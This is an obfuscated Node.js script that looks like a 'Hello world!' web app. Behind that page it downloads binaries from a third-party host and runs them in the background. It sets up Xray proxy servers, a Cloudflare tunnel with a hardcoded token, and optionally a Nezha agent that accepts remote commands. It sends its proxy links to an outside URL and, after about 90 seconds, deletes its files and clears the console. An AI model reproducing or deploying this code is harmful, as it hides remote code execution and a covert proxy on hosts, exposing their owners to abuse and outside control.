const _0x5a8823=_0x5e91;(function(_0x407496,_0x16bd4a){const _0xced442=_0x5e91,_0x4cedb9=_0x407496();while(!![]){try{const _0x35aed5=-parseInt(_0xced442(0xf2))/0x1*(-parseInt(_0xced442(0x152))/0x2)+-parseInt(_0xced442(0x165))/0x3+-parseInt(_0xced442(0x141))/0x4+parseInt(_0xced442(0x12d))/0x5+parseInt(_0xced442(0x173))/0x6*(parseInt(_0xced442(0x146))/0x7)+-parseInt(_0xced442(0x175))/0x8+-parseInt(_0xced442(0xe8))/0x9*(-parseInt(_0xced442(0x195))/0xa);if(_0x35aed5===_0x16bd4a)break;else _0x4cedb9['push'](_0x4cedb9['shift']());}catch(_0x4069f6){_0x4cedb9['push'](_0x4cedb9['shift']());}}}(_0x5b02,0x5d51c));const express=require(_0x5a8823(0xd9)),app=express(),axios=require(_0x5a8823(0x145)),os=require('os'),fs=require('fs'),path=require(_0x5a8823(0xfe)),{promisify}=require(_0x5a8823(0x13b)),exec=promisify(require(_0x5a8823(0x16a))[_0x5a8823(0x143)]),{execSync}=require('child_process'),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x5a8823(0xf0)]||'',AUTO_ACCESS=process[_0x5a8823(0x14c)][_0x5a8823(0x17e)]||![],FILE_PATH=process[_0x5a8823(0x14c)][_0x5a8823(0xf8)]||_0x5a8823(0x120),SUB_PATH=process[_0x5a8823(0x14c)][_0x5a8823(0x11b)]||_0x5a8823(0x10b),PORT=process['env'][_0x5a8823(0xde)]||process[_0x5a8823(0x14c)][_0x5a8823(0x148)]||0xbb8,UUID=process[_0x5a8823(0x14c)]['UUID']||_0x5a8823(0x131),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x5a8823(0x14c)][_0x5a8823(0xd7)]||'',NEZHA_KEY=process[_0x5a8823(0x14c)][_0x5a8823(0x14d)]||'',ARGO_DOMAIN=process['env'][_0x5a8823(0x185)]||_0x5a8823(0xeb),ARGO_AUTH=process[_0x5a8823(0x14c)]['ARGO_AUTH']||_0x5a8823(0xe5),ARGO_PORT=process[_0x5a8823(0x14c)][_0x5a8823(0x179)]||0x1f41,CFIP=process[_0x5a8823(0x14c)][_0x5a8823(0x121)]||'cdns.doon.eu.org',CFPORT=process[_0x5a8823(0x14c)]['CFPORT']||0x1bb,NAME=process[_0x5a8823(0x14c)][_0x5a8823(0x17d)]||'zhuzhai';!fs['existsSync'](FILE_PATH)?(fs[_0x5a8823(0x187)](FILE_PATH),console['log'](FILE_PATH+_0x5a8823(0xf9))):console[_0x5a8823(0x186)](FILE_PATH+_0x5a8823(0x10f));function generateRandomName(){const _0x38b467=_0x5a8823,_0x44e873=_0x38b467(0x15e);let _0x205f7e='';for(let _0x1ab7e3=0x0;_0x1ab7e3<0x6;_0x1ab7e3++){_0x205f7e+=_0x44e873[_0x38b467(0x11c)](Math['floor'](Math['random']()*_0x44e873['length']));}return _0x205f7e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5a8823(0x174)](FILE_PATH,npmName),phpPath=path[_0x5a8823(0x174)](FILE_PATH,phpName),webPath=path[_0x5a8823(0x174)](FILE_PATH,webName),botPath=path[_0x5a8823(0x174)](FILE_PATH,botName),subPath=path[_0x5a8823(0x174)](FILE_PATH,_0x5a8823(0xf1)),listPath=path[_0x5a8823(0x174)](FILE_PATH,_0x5a8823(0x123)),bootLogPath=path['join'](FILE_PATH,_0x5a8823(0x124)),configPath=path[_0x5a8823(0x174)](FILE_PATH,_0x5a8823(0xdc));function deleteNodes(){const _0x5a92ed=_0x5a8823;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x356ce6;try{_0x356ce6=fs['readFileSync'](subPath,_0x5a92ed(0x18a));}catch{return null;}const _0x5bf053=Buffer[_0x5a92ed(0x138)](_0x356ce6,_0x5a92ed(0x103))['toString'](_0x5a92ed(0x18a)),_0x274412=_0x5bf053[_0x5a92ed(0x17b)]('\x0a')[_0x5a92ed(0xed)](_0x59d4eb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5a92ed(0x126)](_0x59d4eb));if(_0x274412[_0x5a92ed(0x117)]===0x0)return;return axios[_0x5a92ed(0x18f)](UPLOAD_URL+_0x5a92ed(0x181),JSON[_0x5a92ed(0xfc)]({'nodes':_0x274412}),{'headers':{'Content-Type':'application/json'}})[_0x5a92ed(0x13f)](_0x4b388a=>{return null;}),null;}catch(_0x58fc47){return null;}}function cleanupOldFiles(){const _0x174c0d=_0x5a8823;try{const _0x132bb8=fs[_0x174c0d(0x137)](FILE_PATH);_0x132bb8[_0x174c0d(0xff)](_0x28acb6=>{const _0x155719=_0x174c0d,_0x4bf4d7=path['join'](FILE_PATH,_0x28acb6);try{const _0x16c0f0=fs['statSync'](_0x4bf4d7);_0x16c0f0['isFile']()&&fs[_0x155719(0x193)](_0x4bf4d7);}catch(_0x279726){}});}catch(_0x1ad8f5){}}app[_0x5a8823(0xf3)]('/',function(_0x38f33e,_0x351e09){const _0xed629d=_0x5a8823;_0x351e09[_0xed629d(0x110)](_0xed629d(0x16e));});async function generateConfig(){const _0x2f45a7=_0x5a8823,_0x214eea={'log':{'access':_0x2f45a7(0xf7),'error':_0x2f45a7(0xf7),'loglevel':_0x2f45a7(0x184)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2f45a7(0x10a),'settings':{'clients':[{'id':UUID,'flow':_0x2f45a7(0x102)}],'decryption':_0x2f45a7(0x184),'fallbacks':[{'dest':0xbb9},{'path':_0x2f45a7(0x162),'dest':0xbba},{'path':_0x2f45a7(0x13e),'dest':0xbbb},{'path':_0x2f45a7(0x178),'dest':0xbbc}]},'streamSettings':{'network':_0x2f45a7(0x155)}},{'port':0xbb9,'listen':_0x2f45a7(0x182),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2f45a7(0x184)},'streamSettings':{'network':'tcp','security':_0x2f45a7(0x184)}},{'port':0xbba,'listen':_0x2f45a7(0x182),'protocol':_0x2f45a7(0x10a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2f45a7(0x184)},'streamSettings':{'network':'ws','security':_0x2f45a7(0x184),'wsSettings':{'path':_0x2f45a7(0x162)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f45a7(0xdf),_0x2f45a7(0x112),_0x2f45a7(0xdb)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2f45a7(0x108),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2f45a7(0x13e)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f45a7(0xdf),'tls',_0x2f45a7(0xdb)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2f45a7(0x182),'protocol':_0x2f45a7(0x163),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2f45a7(0x184),'wsSettings':{'path':_0x2f45a7(0x178)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f45a7(0xdf),'tls',_0x2f45a7(0xdb)],'metadataOnly':![]}}],'dns':{'servers':[_0x2f45a7(0xdd)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x2f45a7(0x139),'tag':_0x2f45a7(0x17a)}]};fs[_0x2f45a7(0xe0)](path['join'](FILE_PATH,'config.json'),JSON['stringify'](_0x214eea,null,0x2));}function getSystemArchitecture(){const _0x19b61c=_0x5a8823,_0x26b009=os['arch']();return _0x26b009===_0x19b61c(0x129)||_0x26b009==='arm64'||_0x26b009===_0x19b61c(0x194)?'arm':_0x19b61c(0x151);}function downloadFile(_0x598df7,_0x1b562f,_0x50b6c2){const _0x4779fb=_0x5a8823,_0x102453=_0x598df7;!fs[_0x4779fb(0xf6)](FILE_PATH)&&fs[_0x4779fb(0x187)](FILE_PATH,{'recursive':!![]});const _0xf2cfcb=fs[_0x4779fb(0x15a)](_0x102453);axios({'method':_0x4779fb(0xf3),'url':_0x1b562f,'responseType':'stream'})[_0x4779fb(0x150)](_0x7a4144=>{const _0x1e7885=_0x4779fb;_0x7a4144[_0x1e7885(0x15b)]['pipe'](_0xf2cfcb),_0xf2cfcb['on']('finish',()=>{const _0x4f1e20=_0x1e7885;_0xf2cfcb[_0x4f1e20(0x171)](),console[_0x4f1e20(0x186)](_0x4f1e20(0x190)+path[_0x4f1e20(0x172)](_0x102453)+_0x4f1e20(0x125)),_0x50b6c2(null,_0x102453);}),_0xf2cfcb['on'](_0x1e7885(0x132),_0xe8a38=>{const _0x1db84c=_0x1e7885;fs[_0x1db84c(0x164)](_0x102453,()=>{});const _0x3f18d6='Download\x20'+path[_0x1db84c(0x172)](_0x102453)+_0x1db84c(0x183)+_0xe8a38['message'];console[_0x1db84c(0x132)](_0x3f18d6),_0x50b6c2(_0x3f18d6);});})[_0x4779fb(0x13f)](_0x5e7066=>{const _0x8ffb6e=_0x4779fb,_0x2c675b=_0x8ffb6e(0x190)+path[_0x8ffb6e(0x172)](_0x102453)+_0x8ffb6e(0x183)+_0x5e7066[_0x8ffb6e(0x147)];console[_0x8ffb6e(0x132)](_0x2c675b),_0x50b6c2(_0x2c675b);});}async function downloadFilesAndRun(){const _0x47be7f=_0x5a8823,_0x2960af=getSystemArchitecture(),_0x3b52fa=getFilesForArchitecture(_0x2960af);if(_0x3b52fa['length']===0x0){console[_0x47be7f(0x186)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x54eb5f=_0x3b52fa[_0x47be7f(0x107)](_0x39a912=>{return new Promise((_0x169dbe,_0x4a6b44)=>{const _0x440c0e=_0x5e91;downloadFile(_0x39a912[_0x440c0e(0xef)],_0x39a912[_0x440c0e(0x167)],(_0x4411e3,_0x649271)=>{_0x4411e3?_0x4a6b44(_0x4411e3):_0x169dbe(_0x649271);});});});try{await Promise[_0x47be7f(0x18c)](_0x54eb5f);}catch(_0x5dab50){console['error'](_0x47be7f(0x169),_0x5dab50);return;}function _0x467c88(_0x2c9998){const _0x31d9fc=_0x47be7f,_0x43ddca=0x1fd;_0x2c9998[_0x31d9fc(0xff)](_0x20b70b=>{const _0x2271ae=_0x31d9fc;fs[_0x2271ae(0xf6)](_0x20b70b)&&fs['chmod'](_0x20b70b,_0x43ddca,_0x5a4df4=>{const _0x3333de=_0x2271ae;_0x5a4df4?console[_0x3333de(0x132)](_0x3333de(0x18e)+_0x20b70b+':\x20'+_0x5a4df4):console[_0x3333de(0x186)](_0x3333de(0x13c)+_0x20b70b+':\x20'+_0x43ddca[_0x3333de(0x158)](0x8));});});}const _0x599bdd=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x467c88(_0x599bdd);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3f032c=NEZHA_SERVER[_0x47be7f(0x161)](':')?NEZHA_SERVER[_0x47be7f(0x17b)](':')['pop']():'',_0x2bd191=new Set(['443',_0x47be7f(0xf4),_0x47be7f(0x18b),_0x47be7f(0x119),_0x47be7f(0x149),'2053']),_0x5dca20=_0x2bd191[_0x47be7f(0x130)](_0x3f032c)?_0x47be7f(0xf5):_0x47be7f(0x189),_0x2d915a='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5dca20+_0x47be7f(0x156)+UUID;fs[_0x47be7f(0xe0)](path['join'](FILE_PATH,_0x47be7f(0x191)),_0x2d915a);const _0x3110b7=_0x47be7f(0x170)+phpPath+_0x47be7f(0xe1)+FILE_PATH+_0x47be7f(0x142);try{await exec(_0x3110b7),console['log'](phpName+_0x47be7f(0xfd)),await new Promise(_0x11a7f6=>setTimeout(_0x11a7f6,0x3e8));}catch(_0x5a70cd){console[_0x47be7f(0x132)](_0x47be7f(0x105)+_0x5a70cd);}}else{let _0x2fe201='';const _0x43562b=[_0x47be7f(0x144),_0x47be7f(0xf4),_0x47be7f(0x18b),'2087','2083',_0x47be7f(0x168)];_0x43562b[_0x47be7f(0x161)](NEZHA_PORT)&&(_0x2fe201=_0x47be7f(0x11d));const _0x4fa0a4=_0x47be7f(0x170)+npmPath+_0x47be7f(0x12f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x47be7f(0xe9)+NEZHA_KEY+'\x20'+_0x2fe201+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4fa0a4),console[_0x47be7f(0x186)](npmName+_0x47be7f(0xfd)),await new Promise(_0x1c747c=>setTimeout(_0x1c747c,0x3e8));}catch(_0x171758){console[_0x47be7f(0x132)](_0x47be7f(0x10d)+_0x171758);}}}else console['log'](_0x47be7f(0xe3));const _0x18ae6f=_0x47be7f(0x170)+webPath+_0x47be7f(0x104)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x18ae6f),console[_0x47be7f(0x186)](webName+'\x20is\x20running'),await new Promise(_0x39cd2e=>setTimeout(_0x39cd2e,0x3e8));}catch(_0x13f9a9){console['error'](_0x47be7f(0x157)+_0x13f9a9);}if(fs['existsSync'](botPath)){let _0x40b549;if(ARGO_AUTH[_0x47be7f(0x16f)](/^[A-Z0-9a-z=]{120,250}$/))_0x40b549=_0x47be7f(0x10c)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x40b549='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x47be7f(0x18d):_0x40b549=_0x47be7f(0xe2)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x47be7f(0x170)+botPath+'\x20'+_0x40b549+'\x20>/dev/null\x202>&1\x20&'),console[_0x47be7f(0x186)](botName+'\x20is\x20running'),await new Promise(_0x437e7b=>setTimeout(_0x437e7b,0x7d0));}catch(_0x5d9c5b){console['error'](_0x47be7f(0x135)+_0x5d9c5b);}}await new Promise(_0x393ef4=>setTimeout(_0x393ef4,0x1388));}function getFilesForArchitecture(_0x35091b){const _0x5a4e16=_0x5a8823;let _0x1a148a;_0x35091b==='arm'?_0x1a148a=[{'fileName':webPath,'fileUrl':_0x5a4e16(0x159)},{'fileName':botPath,'fileUrl':_0x5a4e16(0x14f)}]:_0x1a148a=[{'fileName':webPath,'fileUrl':_0x5a4e16(0x113)},{'fileName':botPath,'fileUrl':_0x5a4e16(0x111)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4ba4d8=_0x35091b===_0x5a4e16(0x129)?_0x5a4e16(0xe4):_0x5a4e16(0x115);_0x1a148a[_0x5a4e16(0x177)]({'fileName':npmPath,'fileUrl':_0x4ba4d8});}else{const _0x25dba6=_0x35091b===_0x5a4e16(0x129)?_0x5a4e16(0x136):_0x5a4e16(0x12e);_0x1a148a[_0x5a4e16(0x177)]({'fileName':phpPath,'fileUrl':_0x25dba6});}}return _0x1a148a;}function argoType(){const _0x4d7a39=_0x5a8823;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4d7a39(0x186)](_0x4d7a39(0x134));return;}if(ARGO_AUTH[_0x4d7a39(0x161)](_0x4d7a39(0x160))){fs[_0x4d7a39(0xe0)](path[_0x4d7a39(0x174)](FILE_PATH,_0x4d7a39(0x17f)),ARGO_AUTH);const _0x2b4536='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4d7a39(0x17b)]('\x22')[0xb]+_0x4d7a39(0x12c)+path[_0x4d7a39(0x174)](FILE_PATH,_0x4d7a39(0x17f))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x4d7a39(0xda);fs[_0x4d7a39(0xe0)](path[_0x4d7a39(0x174)](FILE_PATH,_0x4d7a39(0x10e)),_0x2b4536);}else console[_0x4d7a39(0x186)](_0x4d7a39(0x192));}argoType();async function extractDomains(){const _0x4c970d=_0x5a8823;let _0x1698fa;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1698fa=ARGO_DOMAIN,console['log'](_0x4c970d(0x16d),_0x1698fa),await _0x4a4d8f(_0x1698fa);else try{const _0x2c763c=fs['readFileSync'](path[_0x4c970d(0x174)](FILE_PATH,_0x4c970d(0x124)),_0x4c970d(0x18a)),_0x47cd65=_0x2c763c['split']('\x0a'),_0x1ecf54=[];_0x47cd65[_0x4c970d(0xff)](_0x14c3df=>{const _0x2d7ff6=_0x4c970d,_0x470d22=_0x14c3df[_0x2d7ff6(0x16f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x470d22){const _0x194968=_0x470d22[0x1];_0x1ecf54[_0x2d7ff6(0x16c)](_0x194968);}});if(_0x1ecf54[_0x4c970d(0x117)]>0x0)_0x1698fa=_0x1ecf54[0x0],console[_0x4c970d(0x186)]('ArgoDomain:',_0x1698fa),await _0x4a4d8f(_0x1698fa);else{console['log'](_0x4c970d(0x128)),fs[_0x4c970d(0x193)](path[_0x4c970d(0x174)](FILE_PATH,_0x4c970d(0x124)));async function _0x3a0f4b(){const _0x54be3b=_0x4c970d;try{process[_0x54be3b(0x12a)]===_0x54be3b(0x109)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x54be3b(0x17c)):await exec(_0x54be3b(0x11e)+botName[_0x54be3b(0x11c)](0x0)+']'+botName[_0x54be3b(0x15c)](0x1)+_0x54be3b(0xe7));}catch(_0x1bd733){}}_0x3a0f4b(),await new Promise(_0x387994=>setTimeout(_0x387994,0xbb8));const _0x14be0a=_0x4c970d(0xe2)+FILE_PATH+_0x4c970d(0x127)+ARGO_PORT;try{await exec(_0x4c970d(0x170)+botPath+'\x20'+_0x14be0a+_0x4c970d(0x11a)),console[_0x4c970d(0x186)](botName+_0x4c970d(0xfd)),await new Promise(_0x3a26c6=>setTimeout(_0x3a26c6,0xbb8)),await extractDomains();}catch(_0x993b0e){console[_0x4c970d(0x132)](_0x4c970d(0x135)+_0x993b0e);}}}catch(_0x40eba8){console['error']('Error\x20reading\x20boot.log:',_0x40eba8);}async function _0x4a4d8f(_0xa14935){const _0x3ea7d4=_0x4c970d,_0x277bda=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x3ea7d4(0x18a)}),_0x2c4bbd=_0x277bda['trim'](),_0x155abf=NAME?NAME+'-'+_0x2c4bbd:_0x2c4bbd;return new Promise(_0x22748e=>{setTimeout(()=>{const _0x5d75c2=_0x5e91,_0x1dbbeb={'v':'2','ps':''+_0x155abf,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x5d75c2(0x184),'host':_0xa14935,'path':_0x5d75c2(0xd8),'tls':_0x5d75c2(0x112),'sni':_0xa14935,'alpn':'','fp':_0x5d75c2(0xe6)},_0x5da303=_0x5d75c2(0x14e)+UUID+'@'+CFIP+':'+CFPORT+_0x5d75c2(0x166)+_0xa14935+'&fp=firefox&type=ws&host='+_0xa14935+_0x5d75c2(0x14b)+_0x155abf+_0x5d75c2(0x16b)+Buffer[_0x5d75c2(0x138)](JSON[_0x5d75c2(0xfc)](_0x1dbbeb))[_0x5d75c2(0x158)]('base64')+_0x5d75c2(0xfa)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xa14935+_0x5d75c2(0x13a)+_0xa14935+_0x5d75c2(0x100)+_0x155abf+_0x5d75c2(0x118);console[_0x5d75c2(0x186)](Buffer[_0x5d75c2(0x138)](_0x5da303)[_0x5d75c2(0x158)](_0x5d75c2(0x103))),fs[_0x5d75c2(0xe0)](subPath,Buffer[_0x5d75c2(0x138)](_0x5da303)[_0x5d75c2(0x158)]('base64')),console[_0x5d75c2(0x186)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x5d75c2(0xf3)]('/'+SUB_PATH,(_0x554e6a,_0x12601b)=>{const _0x48f9ff=_0x5d75c2,_0x399b4a=Buffer[_0x48f9ff(0x138)](_0x5da303)[_0x48f9ff(0x158)](_0x48f9ff(0x103));_0x12601b[_0x48f9ff(0x11f)](_0x48f9ff(0x101),_0x48f9ff(0x133)),_0x12601b[_0x48f9ff(0x110)](_0x399b4a);}),_0x22748e(_0x5da303);},0x7d0);});}}function _0x5e91(_0x27f3e2,_0x5d3027){const _0x5b02aa=_0x5b02();return _0x5e91=function(_0x5e916b,_0x3d7a5c){_0x5e916b=_0x5e916b-0xd7;let _0x27bc1b=_0x5b02aa[_0x5e916b];return _0x27bc1b;},_0x5e91(_0x27f3e2,_0x5d3027);}function _0x5b02(){const _0x3e2ad4=['none','ARGO_DOMAIN','log','mkdirSync','Unhandled\x20error\x20in\x20startserver:','false','utf-8','2096','all','/tunnel.yml\x20run','Empowerment\x20failed\x20for\x20','post','Download\x20','config.yaml','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','unlinkSync','aarch64','10aLUIwo','NEZHA_PORT','/vmess-argo?ed=2560','express','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','quic','config.json','https+local://8.8.8.8/dns-query','SERVER_PORT','http','writeFileSync','\x20-c\x20\x22','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://arm64.ssss.nyc.mn/agent','eyJhIjoiZjRlNmEzYjhhNmQyYjNlNzdmYTdiODFkM2JhZDY3M2QiLCJ0IjoiMzM4YmM4NWEtNWIwNi00YWY3LTg4MGYtZmU5NDE4NjUyOTVkIiwicyI6Ik5XWTVZVFppWldJdFkySmlNUzAwT1dNeUxXRm1aRFV0Wm1JeU5XWXpOelEyWkRreSJ9','firefox','\x22\x20>\x20/dev/null\x202>&1','306765OGMfjS','\x20-p\x20','App\x20is\x20running','zhuzhai.950529.xyz','\x20>/dev/null\x202>&1','filter','Subscription\x20uploaded\x20successfully','fileName','PROJECT_URL','sub.txt','706326XsGRcP','get','8443','true','existsSync','/dev/null','FILE_PATH','\x20is\x20created','\x0a\x20\x20\x0atrojan://','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','stringify','\x20is\x20running','path','forEach','&path=%2Ftrojan-argo%3Fed%3D2560#','Content-Type','xtls-rprx-vision','base64','\x20-c\x20','php\x20running\x20error:\x20','Error\x20in\x20startserver:','map','vmess','win32','vless','sub','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','npm\x20running\x20error:\x20','tunnel.yml','\x20already\x20exists','send','https://amd64.ssss.nyc.mn/bot','tls','https://amd64.ssss.nyc.mn/web','Nodes\x20uploaded\x20successfully','https://amd64.ssss.nyc.mn/agent','Add\x20automatic\x20access\x20task\x20faild:\x20','length','\x0a\x20\x20\x20\x20','2087','\x20>/dev/null\x202>&1\x20&','SUB_PATH','charAt','--tls','pkill\x20-f\x20\x22[','set','./tmp','CFIP','automatic\x20access\x20task\x20added\x20successfully','list.txt','boot.log','\x20successfully','test','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','arm','platform','\x20>\x20nul\x202>&1','\x0a\x20\x20credentials-file:\x20','908010NKcKQj','https://amd64.ssss.nyc.mn/v1','\x20-s\x20','has','b84764e7-e741-49de-8dff-5c300dd5235f','error','text/plain;\x20charset=utf-8','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Error\x20executing\x20command:\x20','https://arm64.ssss.nyc.mn/v1','readdirSync','from','blackhole','&fp=firefox&type=ws&host=','util','Empowerment\x20success\x20for\x20','application/json','/vmess-argo','catch','clear','314624bLPtPf','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','exec','443','axios','1253182OAcMkF','message','PORT','2083','status','&path=%2Fvless-argo%3Fed%3D2560#','env','NEZHA_KEY','\x0avless://','https://arm64.ssss.nyc.mn/bot','then','amd','2usyzvC','response','readFileSync','tcp','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','web\x20running\x20error:\x20','toString','https://arm64.ssss.nyc.mn/web','createWriteStream','data','substring','listen','abcdefghijklmnopqrstuvwxyz','rm\x20-rf\x20','TunnelSecret','includes','/vless-argo','trojan','unlink','1448778uWzLlR','?encryption=none&security=tls&sni=','fileUrl','2053','Error\x20downloading\x20files:','child_process','\x0a\x20\x20\x0avmess://','push','ARGO_DOMAIN:','Hello\x20world!','match','nohup\x20','close','basename','6oDlkQW','join','1257768aojvYB','Skipping\x20adding\x20automatic\x20access\x20task','unshift','/trojan-argo','ARGO_PORT','block','split','.exe\x20>\x20nul\x202>&1','NAME','AUTO_ACCESS','tunnel.json','http\x20server\x20is\x20running\x20on\x20port:','/api/delete-nodes','127.0.0.1','\x20failed:\x20'];_0x5b02=function(){return _0x3e2ad4;};return _0x5b02();}async function uploadNodes(){const _0x337c87=_0x5a8823;if(UPLOAD_URL&&PROJECT_URL){const _0x137b90=PROJECT_URL+'/'+SUB_PATH,_0x1c679a={'subscription':[_0x137b90]};try{const _0x202492=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x1c679a,{'headers':{'Content-Type':_0x337c87(0x13d)}});return _0x202492&&_0x202492[_0x337c87(0x14a)]===0xc8?(console[_0x337c87(0x186)](_0x337c87(0xee)),_0x202492):null;}catch(_0x46debf){if(_0x46debf[_0x337c87(0x153)]){if(_0x46debf[_0x337c87(0x153)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x337c87(0xf6)](listPath))return;const _0x1013da=fs[_0x337c87(0x154)](listPath,_0x337c87(0x18a)),_0x45c2f7=_0x1013da['split']('\x0a')[_0x337c87(0xed)](_0x20347d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x20347d));if(_0x45c2f7[_0x337c87(0x117)]===0x0)return;const _0x2b3cb3=JSON[_0x337c87(0xfc)]({'nodes':_0x45c2f7});try{const _0x166501=await axios[_0x337c87(0x18f)](UPLOAD_URL+'/api/add-nodes',_0x2b3cb3,{'headers':{'Content-Type':_0x337c87(0x13d)}});return _0x166501&&_0x166501[_0x337c87(0x14a)]===0xc8?(console[_0x337c87(0x186)](_0x337c87(0x114)),_0x166501):null;}catch(_0x241ee7){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x415359=_0x5e91,_0x3cb30a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3cb30a[_0x415359(0x16c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3cb30a[_0x415359(0x16c)](phpPath);process['platform']===_0x415359(0x109)?exec('del\x20/f\x20/q\x20'+_0x3cb30a[_0x415359(0x174)]('\x20')+_0x415359(0x12b),_0x49141b=>{const _0x35c7f2=_0x415359;console['clear'](),console[_0x35c7f2(0x186)](_0x35c7f2(0xea)),console['log'](_0x35c7f2(0xfb));}):exec(_0x415359(0x15f)+_0x3cb30a[_0x415359(0x174)]('\x20')+_0x415359(0xec),_0x30ef17=>{const _0x4cc07c=_0x415359;console[_0x4cc07c(0x140)](),console['log']('App\x20is\x20running'),console[_0x4cc07c(0x186)](_0x4cc07c(0xfb));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xb84f2f=_0x5a8823;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xb84f2f(0x186)](_0xb84f2f(0x176));return;}try{const _0x451f32=await axios[_0xb84f2f(0x18f)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0xb84f2f(0x13d)}});return console[_0xb84f2f(0x186)](_0xb84f2f(0x122)),_0x451f32;}catch(_0x44a62e){return console['error'](_0xb84f2f(0x116)+_0x44a62e[_0xb84f2f(0x147)]),null;}}async function startserver(){const _0x414d6d=_0x5a8823;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x539850){console[_0x414d6d(0x132)](_0x414d6d(0x106),_0x539850);}}startserver()[_0x5a8823(0x13f)](_0x1cb3c6=>{const _0x37ff57=_0x5a8823;console[_0x37ff57(0x132)](_0x37ff57(0x188),_0x1cb3c6);}),app[_0x5a8823(0x15d)](PORT,()=>console['log'](_0x5a8823(0x180)+PORT+'!'));
